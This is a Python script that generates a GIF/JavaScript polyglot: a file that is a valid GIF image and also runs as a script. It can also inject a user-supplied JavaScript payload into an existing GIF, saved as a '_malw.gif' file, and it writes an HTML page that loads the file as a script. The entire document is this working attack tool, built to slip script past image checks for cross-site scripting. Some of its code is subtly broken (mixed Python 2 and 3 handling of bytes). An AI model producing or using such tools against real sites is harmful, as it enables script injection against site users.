import argparse
import os
 
 
#---------------------------------------------------------
def _hexify(num):
    """
    Converts and formats to hexadecimal
    """
    num = "%x" % num
    if len(num) % 2:
        num = '0'+num
    return num.decode('hex')
 
 
#---------------------------------------------------------
def _generate_and_write_to_file(payload, fname):
    """
    Generates a fake but valid GIF within scriting
    """
    f = open(fname, "wb")
    header = (b'\x47\x49\x46\x38\x39\x61'  #Signature + Version  GIF89a
                        b'\x2F\x2A' #Encoding /* it's a valid Logical Screen Width
                        b'\x0A\x00' #Smal Logical Screen Height
                        b'\x00' #GCTF
                        b'\xFF' #BackgroundColor
                        b'\x00' #Pixel Ratio
                        b'\x2C\x00\x00\x00\x00\x2F\x2A\x0A\x00\x00\x02\x00\x3B' #GlobalColorTable + Blocks
                        b'\x2A\x2F' #Commenting out */
                        b'\x3D\x31\x3B' # enable the script side by introducing =1;
                        )
    trailer = b'\x3B'
    # I made this explicit, step by step .
    f.write(header)
    f.write(payload)
    f.write(trailer)
    f.close()
    return True
 
 
#---------------------------------------------------------
def _generate_launching_page(f):
    """
    Creates the HTML launching page
    """
    htmlpage ="""
                                <html>
                                <head><title>Opening an image</title> </head>
                                <body>
                                    <img src=\"""" + f + """_image.gif\"\>
                                    <script src= \"""" + f + """_image.gif\"> </script>
                                </body>
                                </html>
              """
    html = open("index.html", "wb")
    html.write(htmlpage);
    html.close()
    return True
 
 
#---------------------------------------------------------
def _inject_into_file(payload, fname):
    """
    Injects the payload into existing GIF
    NOTE: if the GIF contains \xFF\x2A and/or \x2A\x5C might caouse issues
    """
    # I know, I can do it all in memory and much more fast.
    # I wont do it here.
    with open(fname + "_malw.gif", "w+b") as fout:
        with open(fname, "rt") as fin:
            for line in fin:
                ls1 = line.replace(b'\x2A\x2F', b'\x00\x00')
                ls2 = ls1.replace(b'\x2F\x2A', b'\x00\x00')             
                fout.write(ls2)                 
        fout.seek(6,0)
        fout.write(b'\x2F\x2A') #/*
 
    f = open(fname + "_malw.gif", "a+b") #appending mode
    f.write(b'\x2A\x2F\x3D\x31\x3B')
    f.write(payload)
    f.write(b'\x3B')
    f.close()
    return True
 
 
#---------------------------------------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("filename",help="the gif file name to be generated/or infected")
    parser.add_argument("js_payload",help="the payload to be injected. For exmample: \"alert(\"test\");\"")
    parser.add_argument("-i", "--inject-to-existing-gif", action="store_true", help="inject into the current gif")
    args = parser.parse_args()
    print("""Ez""")
    if args.inject_to_existing_gif:
         _inject_into_file(args.js_payload, args.filename)
    else:
        _generate_and_write_to_file(args.js_payload, args.filename)
 
    _generate_launching_page(args.filename)
    print "[+] Finished!"